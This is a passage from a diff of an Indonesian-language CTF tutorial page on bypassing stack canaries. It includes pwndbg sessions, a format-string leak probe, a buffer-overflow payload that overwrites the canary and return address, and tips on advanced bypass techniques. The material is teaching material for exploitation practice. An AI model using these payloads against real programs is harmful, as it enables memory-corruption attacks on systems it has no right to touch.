+</span></span></code></pre></div><h4 id="2-memeriksa-nilai-canary-di-stack">2. Memeriksa Nilai Canary di Stack</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/xw <span style="color:#eedd82">$ebp</span>-0xc  <span style="color:#0f0"># Lihat nilai canary di stack</span>
+</span></span><span style="display:flex;"><span>0xffffd00c:     0x41414141   <span style="color:#0f0"># Terlihat canary telah ter-overwrite dengan &#39;AAAA&#39;</span>
+</span></span></code></pre></div><h4 id="3-mencari-offset-format-string-yang-tepat">3. Mencari Offset Format String yang Tepat</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r &lt;&lt;&lt; <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#34;print &#39;%7</span><span style="color:#eedd82">$p</span><span style="color:#87ceeb">&#39;&#34;</span><span style="color:#f00">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Perhatikan output, cari nilai yang looks like canary (biasanya diawali null byte)</span>
+</span></span></code></pre></div><h4 id="4-step-by-step-execution">4. Step-by-Step Execution</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; b *0x804851d    <span style="color:#0f0"># Breakpoint sebelum canary check</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; r
+</span></span><span style="display:flex;"><span>pwndbg&gt; ni              <span style="color:#0f0"># Step through instruction</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Perhatikan nilai register dan stack saat canary verification</span>
+</span></span></code></pre></div><h4 id="5-memverifikasi-canary-yang-dileak">5. Memverifikasi Canary yang Dileak</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Setelah mendapatkan canary melalui format string</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; p/x 0xefbeadde  <span style="color:#0f0"># Ganti dengan nilai yang dileak</span>
+</span></span><span style="display:flex;"><span><span style="color:#eedd82">$1</span> = 0xefbeadde
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/xw <span style="color:#eedd82">$ebp</span>-0xc   <span style="color:#0f0"># Bandingkan dengan nilai di stack</span>
+</span></span><span style="display:flex;"><span>0xffffd00c:     0xefbeadde
+</span></span></code></pre></div><h4 id="6-testing-payload-final">6. Testing Payload Final</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Dengan canary yang valid</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; r &lt;&lt;&lt; <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#34;print &#39;A&#39;*32 + &#39;\xde\xad\xbe\xef&#39; + &#39;B&#39;*8 + &#39;\xef\xbe\xad\xde&#39;&#34;</span><span style="color:#f00">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Program tidak akan crash di __stack_chk_fail tapi di 0xdeadbeef</span>
+</span></span></code></pre></div><h3 id="analisis-register-dan-memory-selama-debugging">Analisis Register dan Memory Selama Debugging</h3>
+<p>Selama proses debugging, perhatikan register dan memory berikut:</p>
+<ol>
+<li><strong>EAX</strong>: Berisi nilai canary yang di-load dari stack</li>
+<li><strong>GS:0x14</strong>: Berisi nilai canary asli dari Thread Local Storage</li>
+<li><strong>EBP-0xc</strong>: Alamat canary di stack</li>
+<li><strong>Stack setelah canary</strong>: Berisi saved EBP dan return address</li>
+</ol>
+<h2 id="5-tips-dan-strategi-ctf">5. Tips dan Strategi CTF</h2>
+<ol>
+<li><strong>Identifikasi Vulnerability Type</strong>: Format string, buffer overflow, dll.</li>
+<li><strong>Check Protections</strong>: Gunakan checksec untuk melihat ada canary atau tidak.</li>
+<li><strong>Cara Dapat Canary</strong>:
 <ul>
-<li><strong>Cari <code>sub esp, X</code></strong> → ukuran buffer = <code>X</code>.</li>
-<li><strong>Cari <code>[ebp-Y]</code></strong> → lokasi canary (biasanya <code>Y = 0xc</code>).</li>
-<li><strong>Offset</strong> = <code>X - Y</code> (dalam hex, konversi ke desimal).</li>
+<li>Format string leak</li>
+<li>Output yang menampilkan nilai stack</li>
+<li>Brute force (jika fork server)</li>
 </ul>
-<p><strong>Contoh Nyata</strong>:</p>
-<ul>
-<li><code>sub esp, 0x54</code> + canary di <code>[ebp-0xc]</code> → offset = <code>0x44</code> (68).</li>
-<li><code>sub esp, 0x60</code> + canary di <code>[ebp-0xc]</code> → offset = <code>0x54</code> (84).</li>
-</ul>
-<p>Gampangnya:<br>
-<strong>Offset = (Alamat buffer) - (Alamat canary)</strong>.</p>
+</li>
+<li><strong>Hitung Offset dengan Akurat</strong>: Gunakan pattern create/pattern offset dalam pwntools.</li>
+<li><strong>Pastikan Endianness</strong>: 32-bit little endian biasanya.</li>
+</ol>
+<h2 id="6-advanced-techniques">6. Advanced Techniques</h2>
+<h3 id="bypass-exit-based-canary-protection">Bypass EXIT-based Canary Protection:</h3>
+<p>Beberapa implementasi hanya memeriksa canary jika fungsi menggunakan <code>return</code>, tetapi tidak jika menggunakan <code>exit()</code> atau <code>longjmp()</code>.</p>
+<h3 id="overwrite-stack-pointer">Overwrite Stack Pointer:</h3>
+<p>Alih-alih mengembalikan ke shellcode, arahkan stack pointer ke area yang bisa dikontrol.</p>
+<h3 id="thread-specific-canaries">Thread-specific Canaries:</h3>
+<p>Pada program multithread, setiap thread punya canary sendiri yang perlu di-leak secara terpisah.</p>
+<h2 id="kesimpulan">Kesimpulan</h2>
+<p>Bypass stack canaries membutuhkan:</p>
+<ol>
+<li>Pemahaman mendalam tentang layout stack</li>
+<li>Kemampuan untuk membaca dan memanipulasi nilai di stack</li>
+<li>Teknik yang tepat berdasarkan situasi (leak, brute force, dll.)</li>
+<li>Tools yang membantu analisis dan exploit development</li>
+</ol>
+<p>Practice makes perfect! Coba challenge binary exploitation di platform CTF seperti pwnable.tw, pwnable.kr, atau CTFtime.org</p>
 
 </article>
 
